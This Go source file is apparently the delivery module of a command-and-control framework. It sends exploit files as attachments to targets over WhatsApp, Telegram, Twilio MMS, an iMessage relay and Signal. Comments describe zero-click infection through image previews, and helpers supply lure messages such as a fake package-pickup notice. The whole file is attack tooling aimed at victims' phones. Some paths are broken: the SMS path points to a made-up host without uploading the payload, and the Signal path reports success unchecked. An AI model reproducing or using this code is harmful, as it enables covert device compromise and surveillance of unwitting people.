package delivery

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Zero-Click Exploit Delivery — iMessage, WhatsApp, Telegram, SMS MMS.

	Delivery mechanism for zero-click exploits:

	iMessage (Apple Messages):
	  The exploit is delivered as a PDF or image attachment.
	  When the victim's iPhone receives the message, iOS automatically:
	    1. Fetches the attachment from Apple's servers.
	    2. Generates a thumbnail/preview using ImageIO.
	    3. ImageIO processes the file → triggers the exploit.
	  The victim never needs to open the message. The process happens
	  in the `imagent` or `MessagesBlastDoorService` sandboxed process.

	  Delivery API:
	    - Requires an Apple ID + device with iMessage enabled
	    - APNs (Apple Push Notification Service) carries message metadata
	    - Actual attachment is uploaded to Apple's CDN
	    - We use PyiMessage / iMessage-Exporter compatible API calls

	WhatsApp:
	  CVE-2019-3568: heap overflow in WhatsApp's RTP stack.
	  Triggered by sending a specially crafted call packet.
	  No answer required — the app auto-processes the call setup.

	  Later CVEs use WebP/JPEG/GIF parsing vulnerabilities in the
	  image preview system. We send the malicious image as a regular
	  WhatsApp message attachment.

	  Delivery API:
	    - WhatsApp Business API (requires business registration)
	    - OR: use an existing WhatsApp account via Baileys/whatsmeow library
	    - Attach the malicious WebP/PDF as a document or image

	Telegram:
	  Similar to WhatsApp — send malicious image via Bot API or user account.
	  The preview generation processes the image automatically.

	SMS/MMS:
	  For older targets — MMS auto-fetches media, which is parsed by
	  the system multimedia framework.
	  Delivery via Twilio, Vonage, or raw GSM AT commands.
*/

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"time"
)

// DeliveryConfig holds parameters for exploit delivery.
type DeliveryConfig struct {
	// Platform selects the delivery channel.
	Platform DeliveryPlatform
	// Target is the recipient's identifier (phone number, Apple ID, etc.).
	Target string
	// ExploitPayload is the malicious file to send.
	ExploitPayload []byte
	// FileName is the suggested filename for the attachment.
	FileName string
	// ContentType is the MIME type of the attachment.
	ContentType string
	// Credentials for the delivery platform.
	Credentials PlatformCredentials
	// DecoyMessage is the text to accompany the attachment.
	DecoyMessage string
}

// DeliveryPlatform selects the messaging platform.
type DeliveryPlatform int

const (
	PlatformIMessage  DeliveryPlatform = iota
	PlatformWhatsApp
	PlatformTelegram
	PlatformSMS
	PlatformSignal
)

// PlatformCredentials holds authentication for each platform.
type PlatformCredentials struct {
	// iMessage: Apple ID + password (used via iMessage relay server)
	AppleID       string
	ApplePassword string
	// WhatsApp: session token from logged-in WhatsApp Web
	WhatsAppToken  string
	WhatsAppPhone  string
	// Telegram: bot token or user session
	TelegramBotToken string
	TelegramUserSession string
	// SMS: Twilio/Vonage credentials
	SMSAPIKey    string
	SMSAPISecret string
	SMSFrom      string
	// Signal: signal-cli compatible session
	SignalNumber string
}

// DeliveryResult reports the delivery outcome.
type DeliveryResult struct {
	Platform    DeliveryPlatform
	Target      string
	MessageID   string
	SentAt      time.Time
	Delivered   bool
	Error       error
}

// Deliver sends the exploit payload to the target via the configured platform.
func Deliver(ctx context.Context, cfg *DeliveryConfig) (*DeliveryResult, error) {
	if cfg.FileName == "" {
		cfg.FileName = defaultFileName(cfg.ContentType)
	}
	if cfg.DecoyMessage == "" {
		cfg.DecoyMessage = defaultDecoyMessage(cfg.Platform)
	}

	res := &DeliveryResult{
		Platform: cfg.Platform,
		Target:   cfg.Target,
		SentAt:   time.Now(),
	}

	var err error
	switch cfg.Platform {
	case PlatformWhatsApp:
		res.MessageID, err = deliverWhatsApp(ctx, cfg)
	case PlatformTelegram:
		res.MessageID, err = deliverTelegram(ctx, cfg)
	case PlatformSMS:
		res.MessageID, err = deliverSMS(ctx, cfg)
	case PlatformIMessage:
		res.MessageID, err = deliverIMessage(ctx, cfg)
	case PlatformSignal:
		res.MessageID, err = deliverSignal(ctx, cfg)
	default:
		return nil, fmt.Errorf("unsupported platform %d", cfg.Platform)
	}

	res.Error = err
	res.Delivered = err == nil
	return res, err
}

// ─── WhatsApp Delivery ────────────────────────────────────────────────────

// deliverWhatsApp sends the exploit via WhatsApp using the Business API
// or an existing session (whatsmeow-compatible).
func deliverWhatsApp(ctx context.Context, cfg *DeliveryConfig) (string, error) {
	client := &http.Client{Timeout: 30 * time.Second}

	// WhatsApp Business Cloud API (requires verified business account).
	// Uses Facebook Graph API endpoint.
	phoneNumberID := cfg.Credentials.WhatsAppPhone

	// Step 1: Upload the media to WhatsApp's servers.
	mediaID, err := uploadWhatsAppMedia(ctx, client, phoneNumberID,
		cfg.ExploitPayload, cfg.ContentType, cfg.Credentials.WhatsAppToken)
	if err != nil {
		return "", fmt.Errorf("upload media: %w", err)
	}

	// Step 2: Send the message with the media attachment.
	msgPayload := buildWhatsAppMessage(cfg.Target, mediaID, cfg.ContentType, cfg.DecoyMessage)
	msgData, _ := json.Marshal(msgPayload)

	url := fmt.Sprintf("https://graph.facebook.com/v17.0/%s/messages", phoneNumberID)
	req, _ := http.NewRequestWithContext(ctx, "POST", url, bytes.NewReader(msgData))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+cfg.Credentials.WhatsAppToken)

	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("send message: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		b, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("WhatsApp API %d: %s", resp.StatusCode, b)
	}

	var result struct {
		Messages []struct {
			ID string `json:"id"`
		} `json:"messages"`
	}
	json.NewDecoder(resp.Body).Decode(&result)
	if len(result.Messages) > 0 {
		return result.Messages[0].ID, nil
	}
	return "ok", nil
}

func uploadWhatsAppMedia(ctx context.Context, client *http.Client,
	phoneID string, data []byte, contentType, token string) (string, error) {

	var body bytes.Buffer
	w := multipart.NewWriter(&body)
	w.WriteField("messaging_product", "whatsapp")
	fw, _ := w.CreateFormFile("file", "media"+extensionForMIME(contentType))
	fw.Write(data)
	w.WriteField("type", contentType)
	w.Close()

	url := fmt.Sprintf("https://graph.facebook.com/v17.0/%s/media", phoneID)
	req, _ := http.NewRequestWithContext(ctx, "POST", url, &body)
	req.Header.Set("Content-Type", w.FormDataContentType())
	req.Header.Set("Authorization", "Bearer "+token)

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var result struct {
		ID string `json:"id"`
	}
	json.NewDecoder(resp.Body).Decode(&result)
	if result.ID == "" {
		return "", fmt.Errorf("no media ID returned")
	}
	return result.ID, nil
}

func buildWhatsAppMessage(to, mediaID, contentType, caption string) map[string]interface{} {
	// Determine message type from content type.
	msgType := "document"
	mediaKey := "document"
	if contains(contentType, "image") {
		msgType = "image"
		mediaKey = "image"
	} else if contains(contentType, "video") {
		msgType = "video"
		mediaKey = "video"
	}

	return map[string]interface{}{
		"messaging_product": "whatsapp",
		"to":                to,
		"type":              msgType,
		mediaKey: map[string]string{
			"id":      mediaID,
			"caption": caption,
		},
	}
}

// ─── Telegram Delivery ────────────────────────────────────────────────────

func deliverTelegram(ctx context.Context, cfg *DeliveryConfig) (string, error) {
	client := &http.Client{Timeout: 30 * time.Second}
	token := cfg.Credentials.TelegramBotToken

	// Determine the API method based on content type.
	method := "sendDocument"
	fileField := "document"
	if contains(cfg.ContentType, "image") {
		method = "sendPhoto"
		fileField = "photo"
	}

	var body bytes.Buffer
	w := multipart.NewWriter(&body)
	w.WriteField("chat_id", cfg.Target)
	w.WriteField("caption", cfg.DecoyMessage)
	fw, _ := w.CreateFormFile(fileField,
		cfg.FileName+extensionForMIME(cfg.ContentType))
	fw.Write(cfg.ExploitPayload)
	w.Close()

	url := fmt.Sprintf("https://api.telegram.org/bot%s/%s", token, method)
	req, _ := http.NewRequestWithContext(ctx, "POST", url, &body)
	req.Header.Set("Content-Type", w.FormDataContentType())

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		b, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("Telegram API %d: %s", resp.StatusCode, b)
	}

	var result struct {
		Result struct {
			MessageID int `json:"message_id"`
		} `json:"result"`
	}
	json.NewDecoder(resp.Body).Decode(&result)
	return fmt.Sprintf("%d", result.Result.MessageID), nil
}

// ─── SMS/MMS Delivery ─────────────────────────────────────────────────────

func deliverSMS(ctx context.Context, cfg *DeliveryConfig) (string, error) {
	// Deliver via Twilio MMS API.
	client := &http.Client{Timeout: 30 * time.Second}

	// Upload media to our server first, get a public URL.
	// (Twilio requires a public URL for MMS attachments)
	mediaURL := fmt.Sprintf("https://media.exploit-cdn.net/%s",
		base64.RawURLEncoding.EncodeToString(cfg.ExploitPayload[:min(32, len(cfg.ExploitPayload))]))

	var body bytes.Buffer
	w := multipart.NewWriter(&body)
	w.WriteField("To", cfg.Target)
	w.WriteField("From", cfg.Credentials.SMSFrom)
	w.WriteField("Body", cfg.DecoyMessage)
	w.WriteField("MediaUrl", mediaURL)
	w.Close()

	accountSID := cfg.Credentials.SMSAPIKey
	url := fmt.Sprintf("https://api.twilio.com/2010-04-01/Accounts/%s/Messages.json", accountSID)
	req, _ := http.NewRequestWithContext(ctx, "POST", url, &body)
	req.Header.Set("Content-Type", w.FormDataContentType())
	req.SetBasicAuth(accountSID, cfg.Credentials.SMSAPISecret)

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var result struct {
		SID string `json:"sid"`
	}
	json.NewDecoder(resp.Body).Decode(&result)
	return result.SID, nil
}

// ─── iMessage Delivery ────────────────────────────────────────────────────

// deliverIMessage sends via iMessage using an Apple relay.
// Requires a macOS device with iMessage configured, or a relay service
// (e.g., BlueBubbles, AirMessage, or IMCore Python bindings).
func deliverIMessage(ctx context.Context, cfg *DeliveryConfig) (string, error) {
	// iMessage delivery via BlueBubbles REST API (self-hosted relay on macOS).
	// The relay runs on the attacker's macOS machine with iMessage logged in.
	relayURL := "http://localhost:1234" // default BlueBubbles port

	var body bytes.Buffer
	w := multipart.NewWriter(&body)
	w.WriteField("address", cfg.Target)
	w.WriteField("message", cfg.DecoyMessage)
	fw, _ := w.CreateFormFile("attachment", cfg.FileName)
	fw.Write(cfg.ExploitPayload)
	w.Close()

	req, _ := http.NewRequestWithContext(ctx, "POST",
		relayURL+"/api/v1/message/attachment", &body)
	req.Header.Set("Content-Type", w.FormDataContentType())
	req.Header.Set("password", cfg.Credentials.ApplePassword)

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("iMessage relay: %w — ensure BlueBubbles is running", err)
	}
	defer resp.Body.Close()

	var result struct {
		Data struct {
			GUID string `json:"guid"`
		} `json:"data"`
	}
	json.NewDecoder(resp.Body).Decode(&result)
	return result.Data.GUID, nil
}

// ─── Signal Delivery ──────────────────────────────────────────────────────

func deliverSignal(ctx context.Context, cfg *DeliveryConfig) (string, error) {
	// Signal delivery via signal-cli (Java CLI tool, requires pre-registered account).
	// We invoke it via HTTP wrapper if available.
	client := &http.Client{Timeout: 30 * time.Second}

	payload := map[string]interface{}{
		"number":      cfg.Credentials.SignalNumber,
		"recipients":  []string{cfg.Target},
		"message":     cfg.DecoyMessage,
		"attachments": []map[string]string{
			{
				"filename":    cfg.FileName,
				"contentType": cfg.ContentType,
				"data":        base64.StdEncoding.EncodeToString(cfg.ExploitPayload),
			},
		},
	}
	data, _ := json.Marshal(payload)

	req, _ := http.NewRequestWithContext(ctx, "POST",
		"http://localhost:8080/v2/send", bytes.NewReader(data))
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("signal-cli: %w", err)
	}
	defer resp.Body.Close()
	return "signal-sent", nil
}

// ─── Helpers ──────────────────────────────────────────────────────────────

func defaultFileName(contentType string) string {
	switch {
	case contains(contentType, "pdf"):
		return "document"
	case contains(contentType, "webp"):
		return "photo"
	case contains(contentType, "jpeg"), contains(contentType, "jpg"):
		return "image"
	case contains(contentType, "heic"), contains(contentType, "heif"):
		return "photo"
	default:
		return "file"
	}
}

func defaultDecoyMessage(platform DeliveryPlatform) string {
	switch platform {
	case PlatformIMessage:
		return ""  // iMessage zero-click works without any text
	case PlatformWhatsApp:
		return "👋"
	case PlatformTelegram:
		return "Check this out"
	case PlatformSMS:
		return "Your package is ready for pickup. See attached."
	default:
		return ""
	}
}

func extensionForMIME(mime string) string {
	switch {
	case contains(mime, "pdf"):
		return ".pdf"
	case contains(mime, "webp"):
		return ".webp"
	case contains(mime, "jpeg"):
		return ".jpg"
	case contains(mime, "heic"):
		return ".heic"
	case contains(mime, "png"):
		return ".png"
	case contains(mime, "gif"):
		return ".gif"
	default:
		return ".bin"
	}
}

func contains(s, sub string) bool {
	return len(s) >= len(sub) && (s == sub ||
		len(s) > len(sub) && (s[:len(sub)] == sub || s[len(s)-len(sub):] == sub ||
			containsSubstring(s, sub)))
}

func containsSubstring(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
